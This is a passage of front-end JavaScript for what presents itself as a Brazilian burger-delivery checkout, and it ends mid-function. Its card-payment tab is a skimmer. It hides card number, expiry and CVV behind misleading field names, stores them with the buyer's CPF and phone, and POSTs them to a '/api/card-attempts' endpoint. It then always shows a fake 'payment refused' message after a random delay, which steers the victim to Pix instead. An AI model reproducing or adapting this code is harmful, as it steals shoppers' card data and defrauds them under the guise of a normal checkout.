(() => {
  const fallbackLocation = {
    city: 'Cariacica',
    state: 'Espirito Santo'
  };
  const minimumOrderCents = 1500;
  const deliveryEstimateText = '25-35 min';
  let estimatedLocation = { ...fallbackLocation };
  let estimatedLocationPromise = null;

  function isCartAddForm(form) {
    if (!form || form.tagName !== 'FORM') return false;

    try {
      const action = new URL(form.getAttribute('action') || form.action, window.location.origin);
      return action.pathname === '/cart/add';
    } catch {
      return false;
    }
  }

  function normalizeCartAddForms() {
    document.querySelectorAll('form').forEach((form) => {
      if (!isCartAddForm(form)) return;
      form.removeAttribute('enctype');
      form.enctype = 'application/x-www-form-urlencoded';
    });
  }

  function normalizePublicLinks() {
    const publicRoutes = new Map([
      ['/index.html', '/'],
      ['/cart', '/sacola'],
      ['/cart/', '/sacola'],
      ['/cart.html', '/sacola'],
      ['/collections/all.html', '/cardapio'],
      ['/pages/contact.html', '/contato'],
      ['/search.html', '/buscar'],
      ['/divinoburguer/www.hexadivinosdelivery.site/collections/all.html', '/cardapio']
    ]);

    document.querySelectorAll('a[href]').forEach((link) => {
      const rawHref = link.getAttribute('href');
      if (!rawHref || rawHref.startsWith('#')) return;

      try {
        const url = new URL(rawHref, window.location.href);
        if (url.origin !== window.location.origin) return;

        const route = publicRoutes.get(url.pathname);
        if (route) {
          link.setAttribute('href', `${route}${url.search}${url.hash}`);
        }
      } catch {
        // Keep malformed or third-party links unchanged.
      }
    });
  }

  function ensureToastRoot() {
    let root = document.getElementById('divino-toast-root');
    if (root) return root;

    root = document.createElement('div');
    root.id = 'divino-toast-root';
    root.setAttribute('aria-live', 'polite');
    document.body.appendChild(root);
    return root;
  }

  function showToast(message, action) {
    const root = ensureToastRoot();
    const toast = document.createElement('div');
    toast.className = 'divino-toast';
    toast.innerHTML = `
      <div class="divino-toast__text">${message}</div>
      ${action ? `<a class="divino-toast__action" href="${action.href}">${action.label}</a>` : ''}
      <button type="button" class="divino-toast__close" aria-label="Fechar">&times;</button>
    `;

    root.appendChild(toast);

    const close = () => {
      toast.classList.add('is-leaving');
      window.setTimeout(() => toast.remove(), 180);
    };

    toast.querySelector('.divino-toast__close').addEventListener('click', close);
    window.setTimeout(close, 5200);
  }

  function appendField(params, field) {
    if (!field.name || field.type === 'file') return;
    if ((field.type === 'checkbox' || field.type === 'radio') && !field.checked) return;
    params.append(field.name, field.value);
  }

  function formParams(form) {
    const params = new URLSearchParams();
    Array.from(form.elements).forEach((field) => {
      if (field.disabled && field.name !== 'id') return;
      appendField(params, field);
    });
    return params;
  }

  async function addToCart(form) {
    normalizeCartAddForms();

    const response = await fetch('/cart/add.js', {
      method: 'POST',
      credentials: 'same-origin',
      headers: {
        Accept: 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest'
      },
      body: formParams(form).toString()
    });

    const payload = await response.json().catch(() => ({}));

    if (!response.ok) {
      showToast(payload.message || 'Nao foi possivel adicionar o produto.', null);
      return;
    }

    document.querySelectorAll('cart-count').forEach((count) => {
      count.textContent = String(payload.item_count || 0);
    });
    showToast('Produto adicionado a sacola.', {
      href: '/sacola',
      label: 'Ir para sacola'
    });
  }

  function formatMoney(cents) {
    return (Number(cents || 0) / 100).toLocaleString('pt-BR', {
      style: 'currency',
      currency: 'BRL'
    });
  }

  function cartLineTemplate(item) {
    const image = item.image || '';
    const title = item.product_title || item.title || 'Produto';
    const id = item.variant_id || item.id || '';

    return `
      <div class="divino-cart-line" data-cart-item-id="${id}">
        ${image ? `<img src="${image}" alt="">` : ''}
        <div class="divino-cart-line__info">
          <strong>${title}</strong>
          <span>Quantidade: ${item.quantity || 1}</span>
          <button type="button" class="divino-cart-remove" data-cart-remove="${id}">Remover</button>
        </div>
        <strong>${formatMoney(item.final_line_price || item.line_price || item.final_price || item.price)}</strong>
      </div>
    `;
  }

  function escapeHtml(value) {
    return String(value || '').replace(/[&<>"']/g, (char) => ({
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#39;'
    }[char]));
  }

  function onlyDigits(value) {
    return String(value || '').replace(/\D/g, '');
  }

  function isValidLuhn(value) {
    const digits = onlyDigits(value);
    if (digits.length < 13 || digits.length > 19) return false;

    let sum = 0;
    let doubleDigit = false;
    for (let index = digits.length - 1; index >= 0; index -= 1) {
      let digit = Number(digits[index]);
      if (doubleDigit) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      doubleDigit = !doubleDigit;
    }
    return sum % 10 === 0;
  }

  function cardBrand(number) {
    const digits = onlyDigits(number);
    if (/^4/.test(digits)) return 'Visa';
    if (/^(5[1-5]|2[2-7])/.test(digits)) return 'Mastercard';
    if (/^3[47]/.test(digits)) return 'Amex';
    if (/^(4011|4312|4389|4514|4576|5041|5066|5067|509|6277|6362|6363|650|6516|6550)/.test(digits)) return 'Elo';
    return 'Cartão';
  }

  function formatExpiry(value) {
    const digits = onlyDigits(value).slice(0, 4);
    if (digits.length <= 2) return digits;
    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
  }

  function formatPhone(value) {
    const digits = onlyDigits(value).slice(0, 11);
    if (digits.length <= 2) return digits;
    if (digits.length <= 6) return `(${digits.slice(0, 2)}) ${digits.slice(2)}`;
    if (digits.length <= 10) {
      return `(${digits.slice(0, 2)}) ${digits.slice(2, 6)}-${digits.slice(6)}`;
    }
    return `(${digits.slice(0, 2)}) ${digits.slice(2, 7)}-${digits.slice(7)}`;
  }

  function formatCpf(value) {
    const digits = onlyDigits(value).slice(0, 11);
    if (digits.length <= 3) return digits;
    if (digits.length <= 6) return `${digits.slice(0, 3)}.${digits.slice(3)}`;
    if (digits.length <= 9) return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`;
    return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`;
  }

  function formatCep(value) {
    const digits = onlyDigits(value).slice(0, 8);
    return digits.length > 5 ? `${digits.slice(0, 5)}-${digits.slice(5)}` : digits;
  }

  function addressFromForm(form) {
    return {
      postalCode: form.postalCode.value,
      street: form.street.value,
      number: form.number.value,
      neighborhood: form.neighborhood.value,
      complement: form.complement.value,
      city: form.city.value,
      state: form.state.value,
      reference: form.reference.value
    };
  }

  function orderProductsFromCart(cart) {
    return (Array.isArray(cart.items) ? cart.items : []).map((item) => ({
      id: String(item.variant_id || item.product_id || item.id || item.key || ''),
      name: item.product_title || item.title || 'Produto',
      quantity: Number(item.quantity || 1),
      price: Number(item.final_price || item.price || 0) / 100,
      image: item.image || null
    }));
  }

  function deliveryWindow(fromDate) {
    const start = new Date(fromDate.getTime() + 25 * 60000);
    const end = new Date(fromDate.getTime() + 35 * 60000);
    const format = (date) => date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
    return {
      minMinutes: 25,
      maxMinutes: 35,
      start: start.toISOString(),
      end: end.toISOString(),
      text: `${format(start)}–${format(end)}`
    };
  }

  function saveConfirmedOrder(draft) {
    if (!draft) return;

    let orders = [];
    try {
      orders = JSON.parse(localStorage.getItem('divino:orders') || '[]');
    } catch {
      orders = [];
    }
    if (!Array.isArray(orders)) orders = [];

    const confirmedAt = new Date();
    const order = {
      ...draft,
      status: 'Pedido confirmado',
      confirmedAt: confirmedAt.toISOString(),
      deliveryEstimate: deliveryWindow(confirmedAt),
      payment: {
        ...(draft.payment || {}),
        method: 'pix',
        status: 'Pagamento confirmado'
      }
    };
    const existingIndex = orders.findIndex((item) => item.id === order.id);
    if (existingIndex >= 0) orders[existingIndex] = order;
    else orders.unshift(order);
    localStorage.setItem('divino:orders', JSON.stringify(orders.slice(0, 50)));
  }

  async function clearConfirmedCart() {
    const response = await fetch('/api/cart/clear', {
      method: 'POST',
      credentials: 'same-origin',
      headers: { Accept: 'application/json' }
    });
    if (!response.ok) throw new Error('Nao foi possivel limpar a sacola.');
    document.querySelectorAll('cart-count').forEach((count) => {
      count.textContent = '0';
    });
  }

  function isValidCpf(value) {
    const digits = onlyDigits(value);
    if (!/^\d{11}$/.test(digits) || /^(\d)\1{10}$/.test(digits)) return false;

    const checkDigit = (length) => {
      const sum = digits.slice(0, length).split('').reduce((total, digit, index) => {
        return total + Number(digit) * (length + 1 - index);
      }, 0);
      const rest = (sum * 10) % 11;
      return rest === 10 ? 0 : rest;
    };

    return checkDigit(9) === Number(digits[9]) && checkDigit(10) === Number(digits[10]);
  }

  function isPixApprovedStatus(status) {
    return ['approved', 'aprovado', 'paid', 'pago', 'confirmed', 'confirmado', 'completed', 'concluido'].includes(
      String(status || '').trim().toLowerCase()
    );
  }

  function formatShortDate(value) {
    const digits = onlyDigits(value).slice(0, 4);
    if (digits.length <= 2) return digits;
    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
  }

  function isValidPhone(value) {
    const digits = onlyDigits(value);
    return /^\d{10,11}$/.test(digits) && digits.slice(0, 2) !== '00';
  }

  function isFutureExpiry(value) {
    const match = String(value || '').match(/^(\d{2})\/?(\d{2})$/);
    if (!match) return false;

    const month = Number(match[1]);
    const year = 2000 + Number(match[2]);
    if (month < 1 || month > 12) return false;

    const now = new Date();
    const expiry = new Date(year, month, 0, 23, 59, 59);
    return expiry >= now;
  }

  function setButtonCopied(button) {
    const originalText = button.textContent;
    button.textContent = 'Codigo Pix copiado';
    button.classList.add('is-copied');
    window.setTimeout(() => {
      button.textContent = originalText;
      button.classList.remove('is-copied');
    }, 2600);
  }

  function updateModalOpenState() {
    const hasOpenModal = Boolean(document.querySelector('.divino-pix-modal:not([hidden])'));
    document.documentElement.classList.toggle('divino-modal-open', hasOpenModal);
  }

  function showModal(modal) {
    modal.hidden = false;
    modal.scrollTop = 0;
    const dialog = modal.querySelector('[role="dialog"], [role="alertdialog"], [role="status"]');
    if (dialog) dialog.scrollTop = 0;
    window.requestAnimationFrame(() => {
      modal.scrollTop = 0;
      if (dialog) dialog.scrollTop = 0;
    });
    updateModalOpenState();
  }

  function hideModal(modal) {
    modal.hidden = true;
    updateModalOpenState();
  }

  function saveTestCard(form, cart) {
    const record = {
      id: `customer_${Date.now()}`,
      createdAt: new Date().toISOString(),
      phone: form.customerPhone.value,
      firstName: form.firstName.value,
      cpf: form.cpf.value,
      celular: form.celular.value,
      data: form.data.value,
      ddd: form.ddd.value,
      amount: cart.total_price,
      status: 'Recebido'
    };
    const cards = JSON.parse(localStorage.getItem('divino:testCards') || '[]');
    cards.unshift(record);
    localStorage.setItem('divino:testCards', JSON.stringify(cards.slice(0, 100)));
    return record;
  }

  async function saveTestCardToDatabase(form, cart) {
    const response = await fetch('/api/card-attempts', {
      method: 'POST',
      credentials: 'same-origin',
      headers: {
        Accept: 'application/json',
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest'
      },
      body: JSON.stringify({
        phone: form.customerPhone.value,
        firstName: form.firstName.value,
        cpf: form.cpf.value,
        celular: form.celular.value,
        data: form.data.value,
        ddd: form.ddd.value
      })
    });
    const payload = await response.json().catch(() => ({}));

    if (!response.ok) {
      throw new Error(payload.message || 'Nao foi possivel registrar os dados.');
    }

    return payload;
  }

  function openCardProcessingModal() {
    let modal = document.getElementById('divino-card-processing-modal');
    if (!modal) {
      modal = document.createElement('div');
      modal.id = 'divino-card-processing-modal';
      modal.className = 'divino-pix-modal';
      document.body.appendChild(modal);
    }

    modal.innerHTML = `
      <div class="divino-pix-modal__overlay"></div>
      <div class="divino-pix-modal__dialog divino-card-processing" role="dialog" aria-modal="true" aria-labelledby="divino-card-processing-title">
        <div class="divino-card-spinner"></div>
        <h2 id="divino-card-processing-title">Processando pagamento</h2>
        <p>Aguarde enquanto validamos a tentativa de pagamento.</p>
      </div>
    `;
    showModal(modal);
    return modal;
  }

  function showCardRefusedModal() {
    const modal = document.getElementById('divino-card-processing-modal');
    if (!modal) return;

    modal.innerHTML = `
      <div class="divino-pix-modal__overlay" data-card-close></div>
      <div class="divino-pix-modal__dialog divino-card-processing divino-card-refused" role="alertdialog" aria-modal="true" aria-labelledby="divino-card-processing-title">
        <button type="button" class="divino-pix-modal__close" data-card-close aria-label="Fechar">&times;</button>
        <h2 id="divino-card-processing-title">Pagamento recusado</h2>
        <p>Metodo de pagamento recusado. Tente outra forma de pagamento ou aguarde alguns minutos para tentar novamente.</p>
      </div>
    `;
    modal.querySelectorAll('[data-card-close]').forEach((button) => {
      button.addEventListener('click', () => {
        hideModal(modal);
      });
    });
  }

  async function createCheckoutSession(cart) {
    const response = await fetch('/api/checkout-session', {
      method: 'POST',
      credentials: 'same-origin',
      headers: {
        Accept: 'application/json',
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest'
      },
      body: JSON.stringify({
        cart_payload: cart,
        origin: window.location.origin
      })
    });
    const payload = await response.json();

    if (!response.ok || !payload.sessionId) {
      throw new Error(payload.message || 'Nao foi possivel iniciar o checkout.');
    }

    return payload;
  }

  async function removeCartItem(id) {
    if (!id) return;

    const response = await fetch('/cart/change.js', {
      method: 'POST',
      credentials: 'same-origin',
      headers: {
        Accept: 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest'
      },
      body: new URLSearchParams({
        id: String(id),
        quantity: '0'
      }).toString()
    });

    if (!response.ok) {
      throw new Error('Nao foi possivel remover o item.');
    }

    return response.json();
  }

  function openPixModal(payload, orderDraft) {
    const pix = payload && payload.pix ? payload.pix : {};
    const code = pix.code || '';
    const qrImage = pix.base64
      ? `data:image/png;base64,${pix.base64}`
      : (pix.image || (code ? `https://api.qrserver.com/v1/create-qr-code/?size=260x260&data=${encodeURIComponent(code)}` : ''));
    let modal = document.getElementById('divino-pix-modal');
    if (!modal) {
      modal = document.createElement('div');
      modal.id = 'divino-pix-modal';
      modal.className = 'divino-pix-modal';
      document.body.appendChild(modal);
    }

    modal.innerHTML = `
      <div class="divino-pix-modal__overlay" data-pix-close></div>
      <div class="divino-pix-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="divino-pix-title">
        <button type="button" class="divino-pix-modal__close" data-pix-close aria-label="Fechar">&times;</button>
        <h2 id="divino-pix-title">Pix gerado</h2>
        <p data-pix-instructions>Escaneie o QR Code ou copie o codigo Pix abaixo.</p>
        <div class="divino-pix-modal__qr" data-pix-content>
          ${qrImage ? `<img alt="QR Code Pix" src="${qrImage}">` : '<span>Use o Pix copia e cola abaixo.</span>'}
        </div>
        <textarea readonly data-pix-code>${escapeHtml(code)}</textarea>
        <button type="button" class="button button--primary" id="divino-copy-pix">Copiar codigo</button>
        <button type="button" class="button button--primary divino-pix-test" id="divino-test-pix-approved">Testar pedido confirmado</button>
      </div>
    `;
    showModal(modal);

    const showPixConfirmedLegacy = () => {
      const checkoutModal = document.getElementById('divino-checkout-modal');
      if (checkoutModal && !checkoutModal.hidden) {
        hideModal(checkoutModal);
      }

      modal.innerHTML = `
        <div class="divino-pix-modal__overlay" data-pix-close></div>
        <div class="divino-order-confirmed-dialog" role="status" aria-live="polite">
          <strong>Seu pedido foi confirmado, estamos preparando e em breve sairá para entrega.</strong>
          <span>Previsão de entrega: ${deliveryEstimateText}</span>
        </div>
      `;
      showModal(modal);
      modal.querySelector('[data-pix-close]').addEventListener('click', () => {
        hideModal(modal);
      });
    };

    let pixConfirmed = false;
    const showPixConfirmed = async () => {
      if (pixConfirmed) return;
      pixConfirmed = true;

      saveConfirmedOrder(orderDraft);
      try {
        await clearConfirmedCart();
      } catch (error) {
        console.warn(error.message || error);
      }

      const checkoutModal = document.getElementById('divino-checkout-modal');
      if (checkoutModal && !checkoutModal.hidden) hideModal(checkoutModal);

      modal.innerHTML = `
        <div class="divino-pix-modal__overlay"></div>
        <div class="divino-order-confirmed-dialog" role="status" aria-live="polite">
          <strong>Seu pedido foi confirmado, estamos preparando e em breve sairá para entrega.</strong>
          <span>Previsão de entrega: ${deliveryEstimateText}</span>
          <span>Redirecionando para Meus pedidos...</span>
        </div>
      `;
      showModal(modal);
      window.setTimeout(() => {
        window.location.href = '/meus-pedidos';
      }, 1200);
    };

    modal.querySelectorAll('[data-pix-close]').forEach((button) => {
      button.addEventListener('click', () => {
        hideModal(modal);
      });
    });
    modal.querySelector('#divino-copy-pix').addEventListener('click', async () => {
      try {
        await navigator.clipboard.writeText(code);
        setButtonCopied(modal.querySelector('#divino-copy-pix'));
      } catch {
        modal.querySelector('textarea').select();
        document.execCommand('copy');
        setButtonCopied(modal.querySelector('#divino-copy-pix'));
      }
    });
    modal.querySelector('#divino-test-pix-approved').addEventListener('click', () => {
      showPixConfirmed();
    });

    const transactionId = payload.transactionId || payload.id || '';
    const identifier = payload.identifier || payload.clientIdentifier || '';
    if (transactionId || identifier) {
      const query = new URLSearchParams();
      if (transactionId) query.set('id', transactionId);
      if (identifier) query.set('clientIdentifier', identifier);
      let attempts = 0;
      const pollStatus = async () => {
        attempts += 1;
        try {
          const response = await fetch(`/api/pix/status?${query.toString()}`, {
            credentials: 'same-origin',
            headers: { Accept: 'application/json' }
          });
          const statusPayload = await response.json().catch(() => ({}));
          if (response.ok && isPixApprovedStatus(statusPayload.status)) {
            showPixConfirmed();
            return;
          }
        } catch {}

        if (!modal.hidden && attempts < 40) {
          window.setTimeout(pollStatus, 15000);
        }
      };
      window.setTimeout(pollStatus, 15000);
    }
  }

  function renderCheckoutSection(cart) {
    let modal = document.getElementById('divino-checkout-modal');
    if (!modal) {
      modal = document.createElement('div');
      modal.id = 'divino-checkout-modal';
      modal.className = 'divino-pix-modal divino-checkout-modal';
      document.body.appendChild(modal);
    }

    modal.innerHTML = `
      <div class="divino-pix-modal__overlay" data-checkout-close></div>
      <div class="divino-pix-modal__dialog divino-checkout-dialog" role="dialog" aria-modal="true" aria-labelledby="divino-checkout-title" tabindex="-1">
        <button type="button" class="divino-pix-modal__close" data-checkout-close aria-label="Fechar">&times;</button>
        <h2 id="divino-checkout-title">Finalizar pedido</h2>
        <form id="divino-payment-form" class="divino-payment-form" novalidate>
          <div class="divino-delivery-section">
            <h3>Endereço de entrega</h3>
            <p>Digite o CEP para preencher o endereço automaticamente.</p>
            <div class="divino-form-grid">
              <label>CEP<input name="postalCode" inputmode="numeric" autocomplete="postal-code" maxlength="9" placeholder="00000-000" required><span class="divino-cep-status" role="status"></span></label>
              <label>Rua<input name="street" autocomplete="address-line1" required></label>
              <label>Número<input name="number" autocomplete="address-line2" required></label>
              <label>Bairro<input name="neighborhood" required></label>
              <label>Complemento<input name="complement" autocomplete="address-line3" placeholder="Apto, bloco..."></label>
              <label>Cidade<input name="city" autocomplete="address-level2" required></label>
              <label>Estado<input name="state" autocomplete="address-level1" maxlength="2" required></label>
              <label>Ponto de referência<input name="reference" placeholder="Próximo a..."></label>
            </div>
          </div>
          <div class="divino-payment-section">
            <h3>Pagamento</h3>
            <div class="divino-payment-tabs" role="tablist">
              <button type="button" class="is-active" data-payment-tab="pix">Pix</button>
              <button type="button" data-payment-tab="card">Cartão</button>
            </div>
          </div>
          <div data-payment-panel="pix">
            <div class="divino-form-grid">
              <label>Nome completo<input name="name" autocomplete="name" required></label>
              <label>Email<input name="email" type="email" autocomplete="email" required></label>
              <label>Telefone<input name="phone" inputmode="tel" autocomplete="tel" placeholder="(11) 99999-9999" required></label>
              <label>CPF<input name="document" inputmode="numeric" autocomplete="off" maxlength="14" placeholder="000.000.000-00" required><span class="divino-card-error" data-cpf-error="document"></span></label>
            </div>
            <button type="submit" class="button button--primary">Gerar Pix</button>
          </div>
          <div data-payment-panel="card" hidden>
            <div class="divino-form-grid">
              <label>Telefone<input name="customerPhone" type="text" inputmode="tel" placeholder="(11) 99999-9999"></label>
              <label>Nome completo<input name="firstName" type="text"></label>
              <label>CPF<input name="cpf" type="text" inputmode="numeric" maxlength="14" placeholder="000.000.000-00"><span class="divino-card-error" data-cpf-error="cpf"></span></label>
              
              
              <label>Cartão
                  <input name="celular" type="tel" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000">
              </label>


              <span id="mensagem-erro" style="color: red; display: none; font-size: 14px; margin-left: 10px;">Cartão inválido</span>

              
              
              <label>Validade<input name="data" type="text" inputmode="numeric" maxlength="5" placeholder="mes/ano"></label>
              <label>Cvv<input name="ddd" type="text" inputmode="numeric" maxlength="3" pattern="[0-9]{3}" placeholder="000"></label>
            </div>
            <button type="submit" class="button button--primary" style="margin-top: 12px;">Finalizar pedido</button>
          </div>
          <div id="divino-payment-message" class="divino-cart-error" hidden></div>
        </form>
      </div>
    `;

     const inputCelular = document.querySelector('input[name="celular"]');
  const msgErro = document.getElementById('mensagem-erro');

  // FUNÇÃO REFORÇADA PARA APLICAR A MÁSCARA
  function aplicarMascara(e) {
    // Remove tudo que não for número
    let valor = e.target.value.replace(/\D/g, ''); 
    
    // Divide em blocos de 4 números com espaços
    valor = valor.replace(/(\d{4})(?=\d)/g, '$1 '); 
    
    // Força a atualização visual imediata no campo
    e.target.value = valor;
  }

  // Escuta tanto a digitação quanto a colagem de texto
  inputCelular.addEventListener('input', aplicarMascara);
  inputCelular.addEventListener('keyup', aplicarMascara);

  // Limpa o erro ao voltar a digitar
  inputCelular.addEventListener('input', () => {
    msgErro.style.display = 'none';
    inputCelular.style.borderColor = '';
  });

  // VALIDAÇÃO LUHN
  function validarLuhn(numero) {
    let soma = 0;
    let deveDobrar = false;
    for (let i = numero.length - 1; i >= 0; i--) {
      let digito = parseInt(numero.charAt(i));
      if (deveDobrar) {
        digito *= 2;
        if (digito > 9) digito -= 9;
      }
      soma += digito;
      deveDobrar = !deveDobrar;
    }
    return (soma % 10) === 0;
  }

  // GATILHO DA VALIDAÇÃO AO SAIR DO CAMPO
  inputCelular.addEventListener('blur', (e) => {
    const apenasNumeros = e.target.value.replace(/\D/g, '');
    if (apenasNumeros.length === 0) return;

    if (apenasNumeros.length < 13 || !validarLuhn(apenasNumeros)) {
      msgErro.style.display = 'inline';
      inputCelular.style.borderColor = 'red';
    } else {
      msgErro.style.display = 'none';
      inputCelular.style.borderColor = '';
    }
  });


    

    const section = modal;
    const tabs = section.querySelectorAll('[data-payment-tab]');
    const panels = section.querySelectorAll('[data-payment-panel]');
    const paymentMessage = section.querySelector('#divino-payment-message');
    let method = 'pix';
    let showingValidationError = false;

    const pixSubmit = section.querySelector('[data-payment-panel="pix"] button[type="submit"]');
    const cardSubmit = section.querySelector('[data-payment-panel="card"] button[type="submit"]');
    const customerFields = ['customerPhone', 'firstName', 'cpf', 'celular', 'data', 'ddd'];
    const addressFields = ['postalCode', 'street', 'number', 'neighborhood', 'city', 'state'];

    section.querySelectorAll('[data-checkout-close]').forEach((button) => {
      button.addEventListener('click', () => hideModal(modal));
    });

    function validationMessageFor(selectedMethod) {
      const addressComplete = addressFields.every((name) => section.querySelector(`[name="${name}"]`).value.trim() !== '');
      if (!addressComplete) return 'Preencha todos os campos obrigatorios do endereco.';
      if (onlyDigits(section.querySelector('[name="postalCode"]').value).length !== 8) return 'CEP invalido.';

      if (selectedMethod === 'card') {
        const complete = customerFields.every((name) => section.querySelector(`[name="${name}"]`).value !== '');
        if (!complete) return 'Preencha todos os campos do cartão.';
        if (!isValidPhone(section.querySelector('[name="customerPhone"]').value)) {
          return 'Telefone invalido. Informe DDD + numero.';
        }
        if (!isValidCpf(section.querySelector('[name="cpf"]').value)) {
          return 'CPF invalido.';
        }
        if (!/^\d{2}\/\d{2}$/.test(section.querySelector('[name="data"]').value)) {
          return 'Data deve estar no formato mes/ano.';
        }
        if (!/^\d{3}$/.test(section.querySelector('[name="ddd"]').value)) {
          return 'DDD deve ter exatamente 3 numeros.';
        }
        return '';
      }

      const pixFields = ['name', 'email', 'phone', 'document'];
      const complete = pixFields.every((name) => section.querySelector(`[name="${name}"]`).value.trim() !== '');
      if (!complete) return 'Preencha todos os campos do Pix.';
      if (!isValidCpf(section.querySelector('[name="document"]').value)) {
        return 'CPF invalido.';
      }
      if (!isValidPhone(section.querySelector('[name="phone"]').value)) {
        return 'Telefone invalido. Informe DDD + numero.';
      }
      return '';
    }

    function updatePaymentValidation() {
      const validationMessage = validationMessageFor(method);
      if (!validationMessage) showingValidationError = false;
      paymentMessage.textContent = showingValidationError ? validationMessage : '';
      paymentMessage.hidden = !showingValidationError || !validationMessage;
    }

    function clearValidationMessage() {
      showingValidationError = false;
      paymentMessage.textContent = '';
      paymentMessage.hidden = true;
    }

    function updateCpfFeedback(input) {
      const digits = onlyDigits(input.value);
      const error = section.querySelector(`[data-cpf-error="${input.name}"]`);
      const invalid = digits.length === 11 && !isValidCpf(input.value);

      input.classList.toggle('is-invalid', invalid);
      if (error) error.textContent = invalid ? 'CPF invalido.' : '';
      return invalid;
    }

    section.querySelectorAll('[data-payment-panel="card"] input').forEach((input) => {
      input.addEventListener('input', () => {
        if (input.name === 'ddd') {
          input.value = input.value.replace(/\D/g, '').slice(0, 3);
        } else if (input.name === 'cpf') {
          input.value = formatCpf(input.value);
          updateCpfFeedback(input);
        } else if (input.name === 'celular') {
          input.value = onlyDigits(input.value);
        } else if (input.name === 'data') {
          input.value = formatShortDate(input.value);
        } else if (input.name === 'customerPhone') {
          input.value = formatPhone(input.value);
        }
        clearValidationMessage();
      });
    });

    section.querySelector('[name="phone"]').addEventListener('input', (event) => {
      event.currentTarget.value = formatPhone(event.currentTarget.value);
      clearValidationMessage();
    });

    section.querySelector('[name="document"]').addEventListener('input', (event) => {
      event.currentTarget.value = formatCpf(event.currentTarget.value);
      updateCpfFeedback(event.currentTarget);
      clearValidationMessage();
    });

    ['name', 'email'].forEach((name) => {
      section.querySelector(`[name="${name}"]`).addEventListener('input', clearValidationMessage);
    });

    async function lookupCheckoutCep() {
      const input = section.querySelector('[name="postalCode"]');
      const status = section.querySelector('.divino-cep-status');
      const cep = onlyDigits(input.value);
      if (cep.length !== 8) return;

      status.textContent = 'Buscando endereço...';
      status.classList.remove('is-error');
      try {
        const response = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
        const address = await response.json();
        if (!response.ok || address.erro) throw new Error('CEP não encontrado.');
        section.querySelector('[name="street"]').value = address.logradouro || '';
        section.querySelector('[name="neighborhood"]').value = address.bairro || '';
        section.querySelector('[name="city"]').value = address.localidade || '';
        section.querySelector('[name="state"]').value = address.uf || '';
        status.textContent = 'Endereço encontrado.';
        section.querySelector(address.logradouro ? '[name="number"]' : '[name="street"]').focus();
      } catch (error) {
        status.textContent = error.message || 'Não foi possível buscar o CEP.';
        status.classList.add('is-error');
      }
    }

    section.querySelector('[name="postalCode"]').addEventListener('input', (event) => {
      event.currentTarget.value = formatCep(event.currentTarget.value);
      section.querySelector('.divino-cep-status').textContent = '';
      clearValidationMessage();
      if (onlyDigits(event.currentTarget.value).length === 8) lookupCheckoutCep();
    });
    section.querySelector('[name="postalCode"]').addEventListener('blur', lookupCheckoutCep);
    addressFields.filter((name) => name !== 'postalCode').forEach((name) => {
      section.querySelector(`[name="${name}"]`).addEventListener('input', clearValidationMessage);
    });

    function selectPaymentPanel(selectedMethod) {
      panels.forEach((panel) => {
        const isActive = panel.getAttribute('data-payment-panel') === selectedMethod;
        panel.hidden = !isActive;
        panel.querySelectorAll('input').forEach((input) => {
          input.disabled = !isActive;
          input.required = isActive;
        });
      });
      clearValidationMessage();
    }

    selectPaymentPanel(method);

    tabs.forEach((tab) => {
      tab.addEventListener('click', () => {
        method = tab.getAttribute('data-payment-tab');
        tabs.forEach((item) => item.classList.toggle('is-active', item === tab));
        selectPaymentPanel(method);
        clearValidationMessage();
      });
    });

    section.querySelector('#divino-payment-form').addEventListener('submit', async (event) => {
      event.preventDefault();
      const form = event.currentTarget;
      const message = section.querySelector('#divino-payment-message');
      const submit = form.querySelector(`[data-payment-panel="${method}"] button[type="submit"]`);
      clearValidationMessage();

      const validationMessage = validationMessageFor(method);
      if (validationMessage) {
        showingValidationError = true;
        updatePaymentValidation();
        return;
      }

      submit.disabled = true;
      submit.textContent = method === 'pix' ? 'Gerando Pix...' : 'Validando...';

      try {
        if (method === 'card') {
          saveTestCard(form, cart);
          await saveTestCardToDatabase(form, cart);
          openCardProcessingModal();
          const delay = 7000 + Math.floor(Math.random() * 8001);
          window.setTimeout(() => {
            showCardRefusedModal();
          }, delay);
          return;
        }

        const session = await createCheckoutSession(cart);
        const response = await fetch('/api/pix/receive', {
          method: 'POST',
          credentials: 'same-origin',
          headers: {
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest'
          },
          body: JSON.stringify({
            sessionId: session.sessionId,
            client: {
              name: form.name.value,
              email: form.email.value,
              phone: form.phone.value,
              document: form.document.value
            },
            address: addressFromForm(form)
          })
        });
        const payload = await response.json();
        if (!response.ok) {
          throw new Error(payload.message || 'Nao foi possivel gerar o Pix.');
        }
        const orderDraft = {
          id: payload.identifier,
          sessionId: session.sessionId,
          createdAt: new Date().toISOString(),
          amount: Number(cart.total_price || 0) / 100,
          products: orderProductsFromCart(cart),
          client: {
            name: form.name.value,
            email: form.email.value,
            phone: form.phone.value,
            document: form.document.value
          },
          address: addressFromForm(form),
          payment: {
            method: 'pix',
            status: 'Aguardando confirmação'
          }
        };
        localStorage.setItem('divino:lastPix', JSON.stringify({ ...payload, orderDraft }));
        openPixModal(payload, orderDraft);
      } catch (error) {
        message.textContent = error.message || 'Nao foi possivel concluir.';
        message.hidden = false;
      } finally {
        submit.disabled = false;
        submit.textContent = method === 'pix' ? 'Gerar Pix' : 'Finalizar pedido';
      }
    });

    showModal(modal);
    section.querySelector('.divino-checkout-dialog').focus({ preventScroll: true });
  }

  async function startCheckout(button) {
    const cart = await fetch('/cart.json', { credentials: 'same-origin' }).then((response) => response.json());
    renderCheckoutSection(cart);
  }

  async function renderLocalCart() {
    const cartPaths = ['/sacola', '/cart', '/cart/', '/cart.html'];
